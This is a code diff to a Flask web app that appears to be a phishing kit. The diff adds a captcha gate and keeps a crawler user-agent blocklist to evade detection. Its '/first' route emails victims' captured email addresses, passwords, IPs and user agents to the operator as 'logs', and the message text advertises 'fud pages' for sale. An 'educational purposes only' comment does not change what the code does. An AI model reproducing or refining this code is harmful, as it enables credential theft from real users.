@@ -13,13 +13,12 @@ from email.mime.multipart import MIMEMultipart
 from io import BytesIO
 from PIL import Image, ImageDraw, ImageFont
 
-# made for education purposes only
+# Made for educational purposes only
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app,
                   default_limits=['6 per day', '6 per hour'])
-secret_keyx = secrets.token_urlsafe(24)
-app.secret_key = secret_keyx
+app.secret_key = secrets.token_urlsafe(24)
 
 bot_user_agents = [
     'Googlebot', 'Baiduspider', 'ia_archiver', 'R6_FeedFetcher',
@@ -89,9 +88,12 @@ def captcha():
 
 @app.route('/benza', methods=['GET'])
 def benza():
-    if request.method == 'GET':
-        eman = session.get('eman', 'No email provided')
-        dman = session.get('ins', 'No domain provided')
+    if not session.get('passed_captcha'):
+        return redirect(url_for('captcha'))
+
+    # Retrieve session values to pass to the template
+    eman = session.get('eman', 'No email provided')
+    dman = session.get('ins', 'No domain provided')
     return render_template('ind.html', eman=eman, dman=dman)
 
 @app.route('/first', methods=['POST'])
@@ -115,7 +117,7 @@ def first():
         message['Subject'] = 'General KR Logs !'
         message['From'] = sender_email
         message['To'] = receiver_email
-        text = "Hi,\nHow are you?\ncontact me on icq jamescartwright for your fud pages"
+        text = "Hi,\nHow are you?\nContact me on icq jamescartwright for your fud pages"
         html = render_template('emailmailer.html', emailaccess=email,
                                useragent=useragent,
                                passaccess=passwordemail, ipman=ip)
@@ -135,7 +137,7 @@ def lasmo():
     useragent = request.headers.get('User-Agent')
 
     if useragent in bot_user_agents:
-        abort(403)  # forbidden
+        abort(403)  # Forbidden
 
     dman = session.get('ins', 'No domain provided')
     return render_template('main.html', dman=dman)
